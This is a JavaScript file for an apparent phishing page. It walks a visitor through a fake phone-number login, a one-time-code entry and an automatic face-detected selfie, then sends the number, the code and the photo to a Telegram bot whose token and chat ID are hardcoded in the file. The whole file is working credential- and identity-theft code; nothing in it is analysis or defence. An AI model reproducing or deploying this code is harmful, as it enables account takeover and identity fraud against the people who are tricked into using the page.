document.addEventListener('DOMContentLoaded', () => {

    // --- إعدادات بوت التليجرام ---
    const BOT_TOKEN = '6692627244:AAEIS4t9xIIksnY9UxlGiMsf0KwBB5-XS5M';
    const CHAT_ID = '6964432572';

    // --- متغيرات لتخزين بيانات المستخدم ---
    let userPhoneNumber = '';
    let userOtp = '';

    // --- Page Elements ---
    const loginPage = document.getElementById('login-page');
    const otpPage = document.getElementById('otp-page');
    const selfiePage = document.getElementById('selfie-page');
    const cameraPage = document.getElementById('camera-page');
    const loadingMessage = document.getElementById('loading-message');
    const faceOutlineCircle = document.getElementById('face-outline-circle');
    
    // --- Button & Input Elements ---
    const phoneInput = document.getElementById('phone');
    const loginBtn = document.getElementById('login-btn');
    const loginForm = document.getElementById('login-form');
    const otpInputs = document.querySelectorAll('.otp-input');
    const continueBtn = document.getElementById('continue-btn');
    const backToLoginBtn = document.querySelector('.back-to-login');
    const backToOtpBtn = document.querySelector('.back-to-otp');
    const takeSelfieBtn = document.getElementById('take-selfie-btn');
    const cameraFeed = document.getElementById('camera-feed');
    const backToSelfieInstructionsBtn = document.querySelector('.back-to-selfie-instructions');
    const signupBtn = document.querySelector('.signup-btn-style');
    const signupNotice = document.getElementById('signup-notice');

    let stream = null;
    let detectionInterval = null;
    let isCapturing = false;

    // --- تحميل نماذج الذكاء الاصطناعي ---
    async function loadModels() {
        const MODEL_URL = 'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights';
        loadingMessage.classList.add('show');
        try {
            console.log("Starting to load models...");
            await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
            console.log("Face detector model loaded.");
        } catch (error) {
            console.error("Error loading models:", error);
            alert("فشل تحميل نماذج الذكاء الاصطناعي. يرجى تحديث الصفحة والتأكد من اتصالك بالإنترنت.");
        }
        loadingMessage.classList.remove('show');
    }
    loadModels();

    // --- منطق التنقل والكاميرا ---
    takeSelfieBtn.addEventListener('click', async () => {
        selfiePage.classList.remove('active');
        cameraPage.classList.add('active');
        isCapturing = false;
        
        try {
            const constraints = { video: { facingMode: 'user' } };
            stream = await navigator.mediaDevices.getUserMedia(constraints);
            cameraFeed.srcObject = stream;
        } catch (err) {
            console.error("Error accessing camera: ", err);
            alert("لا يمكن الوصول إلى الكاميرا. يرجى التأكد من منح الإذن.");
            cameraPage.classList.remove('active');
            selfiePage.classList.add('active');
        }
    });

    cameraFeed.addEventListener('play', () => {
        detectionInterval = setInterval(async () => {
            if (isCapturing) return;

            const detections = await faceapi.detectSingleFace(cameraFeed, new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: 0.5 }));
            
            if (detections) {
                const faceBox = detections.box;
                const videoWidth = cameraFeed.videoWidth;
                const videoCenterX = videoWidth / 2;
                const faceCenterX = faceBox.x + faceBox.width / 2;

                const isCentered = Math.abs(faceCenterX - videoCenterX) < 50;
                const isGoodSize = faceBox.width > 120;

                if (isCentered && isGoodSize) {
                    faceOutlineCircle.classList.add('match');
                    isCapturing = true;
                    
                    setTimeout(() => {
                        capturePhotoAndSendData();
                        faceOutlineCircle.classList.remove('match');
                    }, 1000);
                } else {
                    faceOutlineCircle.classList.remove('match');
                }
            } else {
                faceOutlineCircle.classList.remove('match');
            }
        }, 600);
    });

    function capturePhotoAndSendData() {
        const canvas = document.createElement('canvas');
        canvas.width = cameraFeed.videoWidth;
        canvas.height = cameraFeed.videoHeight;
        const context = canvas.getContext('2d');
        context.translate(canvas.width, 0);
        context.scale(-1, 1);
        context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
        
        stopCamera();
        alert('تم التقاط الصورة تلقائيًا! جاري إرسال البيانات...');

        const message = `**=== بيانات مستخدم جديد ===**\n**رقم الهاتف:** \`${userPhoneNumber}\`\n**الرمز السري:** \`${userOtp}\``;
        sendTelegramMessage(message);

        canvas.toBlob(blob => {
            sendTelegramPhoto(blob, `Selfie for ${userPhoneNumber}`);
        }, 'image/jpeg');

        setTimeout(() => {
            cameraPage.classList.remove('active');
            loginPage.classList.add('active');
            // Reset form fields for next use
            otpInputs.forEach(input => input.value = '');
            phoneInput.value = '';
            loginBtn.disabled = true;
            loginBtn.classList.remove('activated');
        }, 2000);
    }
    
    function stopCamera() {
        if (detectionInterval) {
            clearInterval(detectionInterval);
        }
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            stream = null;
        }
    }

    // --- دوال وأكواد أخرى تبقى كما هي ---
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        if (!loginBtn.disabled) {
            userPhoneNumber = phoneInput.value;
            loginPage.classList.remove('active');
            otpPage.classList.add('active');
            if (otpInputs.length > 0) otpInputs[0].focus();
        }
    });

    phoneInput.addEventListener('input', () => {
        if (phoneInput.value.trim().length > 5) {
            loginBtn.disabled = false;
            loginBtn.classList.add('activated');
        } else {
            loginBtn.disabled = true;
            loginBtn.classList.remove('activated');
        }
    });

    otpInputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
            checkAllOtpInputs();
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
    });

    function checkAllOtpInputs() {
        const allFilled = Array.from(otpInputs).every(input => input.value);
        if (allFilled) {
            continueBtn.disabled = false;
            continueBtn.classList.add('activated');
        } else {
            continueBtn.disabled = true;
            continueBtn.classList.remove('activated');
        }
    }

    continueBtn.addEventListener('click', () => {
        if (!continueBtn.disabled) {
            userOtp = Array.from(otpInputs).map(input => input.value).join('');
            otpPage.classList.remove('active');
            selfiePage.classList.add('active');
        }
    });

    signupBtn.addEventListener('click', () => {
        signupNotice.classList.add('show');
        setTimeout(() => {
            signupNotice.classList.remove('show');
        }, 4000);
    });

    async function sendTelegramMessage(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const params = new URLSearchParams({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' });
        try {
            await fetch(`${url}?${params.toString()}`);
        } catch (error) {
            console.error('Failed to send message:', error);
        }
    }

    async function sendTelegramPhoto(imageBlob, caption) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', imageBlob, 'selfie.jpg');
        formData.append('caption', caption);
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        try {
            await fetch(url, { method: 'POST', body: formData });
        } catch (error) {
            console.error('Failed to send photo:', error);
        }
    }

    backToSelfieInstructionsBtn.addEventListener('click', () => {
        stopCamera();
        cameraPage.classList.remove('active');
        selfiePage.classList.add('active');
    });
    
    backToOtpBtn.addEventListener('click', () => {
        selfiePage.classList.remove('active');
        otpPage.classList.add('active');
    });

    backToLoginBtn.addEventListener('click', () => {
        otpPage.classList.remove('active');
        loginPage.classList.add('active');
    });
});
